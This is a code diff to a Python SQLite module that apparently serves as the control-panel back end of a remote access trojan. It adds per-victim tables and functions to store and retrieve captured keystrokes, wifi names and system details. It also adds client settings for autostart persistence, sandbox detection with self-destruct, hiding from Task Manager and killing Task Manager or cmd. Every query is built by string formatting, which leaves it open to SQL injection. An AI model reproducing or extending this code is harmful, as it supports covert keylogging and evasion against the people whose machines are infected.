@@ -29,7 +29,6 @@ def create():
 
     ### make keylog table here
     
-
 def register(ip, username, os, registered, last_seen, uuid):
     db = sqlite3.connect('main.db')
     db.execute("INSERT INTO users VALUES('{0}', '{1}', '{2}', '{3}', '{4}', '{5}');".format(ip, username, os, registered, last_seen, uuid))
@@ -117,6 +116,55 @@ def create_user_wifilisttable(uuid):
     wifiname VARCHAR(32) NOT NULL
     ); '''.format(uuid.replace('-', '')))
 
+def create_user_keylog_table(uuid):
+    db = sqlite3.connect('main.db')
+    cur = db.cursor()
+    db.execute(''' CREATE TABLE keylogger_{0} (
+    
+    keylog VARCHAR(32) NOT NULL
+    ); '''.format(uuid.replace('-', '')))
+
+def create_user_settings_table(uuid):
+    db = sqlite3.connect('main.db')
+    cur = db.cursor()
+    db.execute(''' CREATE TABLE settings_{0} (
+    auto_start VARCHAR(32) NOT NULL,
+    auto_start_autostart_folder VARCHAR(32) NOT NULL,
+    auto_start_desktop_shortcut VARCHAR(32) NOT NULL,
+    detect_sandbox VARCHAR(32) NOT NULL,
+    detect_sandbox_exit VARCHAR(32) NOT NULL,
+    detect_sandbox_destruct VARCHAR(32) NOT NULL,
+    detect_sandbox_block VARCHAR(32) NOT NULL,
+    task_manager_hide VARCHAR(32) NOT NULL,
+    task_manager_kill VARCHAR(32) NOT NULL,
+    cmd_kill VARCHAR(32) NOT NULL
+    ); '''.format(uuid.replace('-', '')))
+
+def check_client_settings(uuid):
+    db = sqlite3.connect('main.db')
+    cur = db.cursor()
+    cur.execute('SELECT * FROM settings_{0} ;'.format(uuid.replace('-', '')))
+    return cur.fetchall()
+
+def insert_user_settings(uuid):
+    db = sqlite3.connect('main.db')
+    print(uuid)
+    cur = db.cursor()
+    db.execute("INSERT INTO settings_{0} VALUES('{1}', '{2}', '{3}', '{4}', '{5}', '{6}', '{7}', '{8}', '{9}', '{10}');".format(uuid.replace('-', ''), 1, 1, 0, 0, 0, 0, 0, 1, 0, 0 ))
+    db.commit()
+
+def create_user_info_table(uuid):
+    db = sqlite3.connect('main.db')
+    cur = db.cursor()
+    db.execute(''' CREATE TABLE info_{0} (
+    
+    os VARCHAR(32) NOT NULL,
+    cpu VARCHAR(32) NOT NULL,
+    storage VARCHAR(32) NOT NULL,
+    gpu VARCHAR(32) NOT NULL
+    
+    ); '''.format(uuid.replace('-', '')))
+
 def insert_user_wifi(uuid, wifi_name):
     db = sqlite3.connect('main.db')
     print(uuid)
@@ -124,11 +172,26 @@ def insert_user_wifi(uuid, wifi_name):
     db.execute("INSERT INTO wifidata_{0} VALUES('{1}');".format(uuid.replace('-', ''), wifi_name ))
     db.commit()
 
+def insert_user_keylog(uuid, keylog):
+    db = sqlite3.connect('main.db')
+    print(uuid)
+    cur = db.cursor()
+    db.execute("INSERT INTO keylogger_{0} VALUES('{1}');".format(uuid.replace('-', ''), keylog))
+    db.commit()
+
 def get_user_wifi_names(uuid):
     print(uuid)
     db = sqlite3.connect('main.db')
     cur = db.cursor()
     cur.execute('SELECT * FROM wifidata_{0} ;'.format(uuid.replace('-', '')))
+
+    return cur.fetchall()
+
+def get_user_keylog(uuid):
+    print(uuid)
+    db = sqlite3.connect('main.db')
+    cur = db.cursor()
+    cur.execute('SELECT * FROM keylogger_{0} ;'.format(uuid.replace('-', '')))
 
     return cur.fetchall()
 
